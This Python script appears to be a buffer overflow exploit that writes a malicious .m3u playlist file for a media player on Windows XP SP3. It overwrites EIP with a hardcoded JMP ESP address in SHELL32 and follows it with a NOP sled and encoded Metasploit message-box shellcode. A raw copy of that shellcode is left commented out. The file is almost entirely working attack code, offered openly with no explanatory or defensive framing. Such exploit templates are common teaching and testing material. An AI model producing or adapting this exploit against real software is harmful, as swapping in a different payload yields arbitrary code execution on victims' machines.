# tested on windows xp sp3
import sys

# windows/messagebox - 300 bytes (COMENTADO)
"""shellcode =(
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
"\xe8\x61\xff\xff\xff\x68\x75\x58\x20\x20\x68\x74\x79\x6d\x62"
"\x68\x74\x65\x75\x73\x68\x72\x20\x6d\x61\x68\x6f\x20\x70\x6f"
"\x68\x6f\x72\x61\x64\x68\x45\x78\x70\x6c\x31\xdb\x88\x5c\x24"
"\x19\x89\xe3\x68\x32\x21\x58\x20\x68\x20\x32\x30\x31\x68\x42"
"\x53\x65\x67\x68\x64\x6f\x20\x53\x68\x6f\x20\x31\x20\x68\x63"
"\x75\x72\x73\x68\x4d\x69\x6e\x69\x31\xc9\x88\x4c\x24\x1a\x89"
"\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08")
 """
# windows/messagebox | msfencode -e x86/alpha_mixed - 661 bytes
shellcode =(
"\xda\xc4\xd9\x74\x24\xf4\x5e\x56\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x78"
"\x59\x6a\x4b\x6d\x4b\x58\x59\x52\x54\x31\x34\x79\x64\x54\x71"
"\x5a\x72\x38\x32\x31\x67\x46\x51\x68\x49\x30\x64\x6e\x6b\x71"
"\x61\x50\x30\x6c\x4b\x34\x36\x54\x4c\x4c\x4b\x34\x36\x45\x4c"
"\x4c\x4b\x67\x36\x56\x68\x6e\x6b\x33\x4e\x31\x30\x6e\x6b\x74"
"\x76\x77\x48\x72\x6f\x66\x78\x53\x45\x69\x63\x30\x59\x56\x61"
"\x58\x51\x4b\x4f\x4b\x51\x63\x50\x4e\x6b\x52\x4c\x46\x44\x35"
"\x74\x6e\x6b\x67\x35\x55\x6c\x4e\x6b\x70\x54\x57\x58\x52\x58"
"\x45\x51\x4a\x4a\x6e\x6b\x71\x5a\x64\x58\x4e\x6b\x53\x6a\x67"
"\x50\x33\x31\x58\x6b\x78\x63\x50\x34\x67\x39\x6e\x6b\x70\x34"
"\x4c\x4b\x75\x51\x48\x6e\x50\x31\x39\x6f\x36\x51\x4f\x30\x49"
"\x6c\x4c\x6c\x4f\x74\x4f\x30\x44\x34\x54\x47\x69\x51\x48\x4f"
"\x44\x4d\x66\x61\x48\x47\x6a\x4b\x39\x64\x67\x4b\x51\x6c\x65"
"\x74\x64\x68\x74\x35\x6d\x31\x6e\x6b\x31\x4a\x56\x44\x66\x61"
"\x48\x6b\x70\x66\x6e\x6b\x74\x4c\x42\x6b\x4e\x6b\x62\x7a\x65"
"\x4c\x76\x61\x78\x6b\x4c\x4b\x36\x64\x4e\x6b\x75\x51\x49\x78"
"\x4f\x79\x31\x54\x77\x54\x55\x4c\x75\x31\x38\x43\x38\x32\x45"
"\x58\x65\x79\x4a\x74\x4e\x69\x6d\x35\x4f\x79\x69\x52\x51\x78"
"\x4e\x6e\x50\x4e\x36\x6e\x6a\x4c\x51\x42\x7a\x48\x4f\x6f\x4b"
"\x4f\x59\x6f\x59\x6f\x4e\x69\x52\x65\x35\x54\x6d\x6b\x73\x4e"
"\x4e\x38\x58\x62\x30\x73\x6e\x67\x57\x6c\x57\x54\x62\x72\x49"
"\x78\x6c\x4e\x79\x6f\x6b\x4f\x49\x6f\x6e\x69\x52\x65\x55\x58"
"\x35\x38\x70\x6c\x32\x4c\x77\x50\x51\x51\x43\x58\x66\x53\x66"
"\x52\x66\x4e\x31\x74\x42\x48\x32\x55\x50\x73\x32\x45\x34\x32"
"\x4c\x48\x43\x6c\x76\x44\x67\x7a\x6b\x39\x6a\x46\x52\x76\x49"
"\x6f\x50\x55\x43\x34\x6e\x69\x6b\x72\x56\x30\x6f\x4b\x6e\x48"
"\x49\x32\x52\x6d\x4d\x6c\x6f\x77\x75\x4c\x35\x74\x72\x72\x6a"
"\x48\x45\x31\x6b\x4f\x59\x6f\x49\x6f\x61\x78\x51\x65\x70\x58"
"\x57\x50\x71\x30\x61\x78\x54\x34\x33\x49\x62\x4d\x42\x42\x35"
"\x38\x73\x44\x31\x75\x54\x35\x63\x43\x62\x48\x61\x62\x37\x50"
"\x52\x4d\x71\x71\x73\x58\x72\x4f\x37\x50\x74\x30\x72\x4f\x70"
"\x68\x32\x4f\x31\x62\x35\x31\x45\x34\x52\x48\x31\x55\x64\x38"
"\x54\x30\x72\x4c\x34\x71\x6b\x6b\x4c\x48\x73\x6c\x37\x54\x46"
"\x79\x4d\x59\x4d\x33\x75\x38\x77\x42\x57\x51\x56\x38\x51\x30"
"\x30\x68\x75\x70\x55\x62\x34\x70\x66\x51\x35\x38\x42\x62\x43"
"\x63\x30\x65\x71\x77\x63\x58\x72\x44\x30\x6f\x31\x30\x73\x63"
"\x72\x48\x70\x6f\x71\x30\x34\x71\x57\x50\x63\x58\x32\x43\x50"
"\x75\x32\x52\x32\x53\x55\x38\x32\x6d\x30\x69\x30\x6e\x30\x69"
"\x45\x61\x6a\x69\x6c\x48\x62\x6c\x74\x64\x67\x6a\x4c\x49\x58"
"\x61\x35\x61\x69\x42\x70\x52\x61\x43\x46\x31\x66\x32\x59\x6f"
"\x7a\x70\x76\x51\x49\x50\x72\x70\x4b\x4f\x46\x35\x36\x68\x41"
"\x41")

buffer = "\x41" * 1024
eip = "\xd7\x30\x9d\x7c"	# JMP ESP - SHELL32
nops = "\x90" * 20
junk = "\x42" * (2000 - len(nops + shellcode))

print "[+] Creating malicious exploit_direct-ret.m3u file"
try:
    file = open("exploit_direct-ret.m3u","w")
    file.write(buffer + eip + nops + shellcode + junk)
    file.close()
    print "[+] File created"
except:
    print "[x] Could not create file"

print "[+] Payload length: %d" % len(buffer + eip + nops + shellcode + junk)
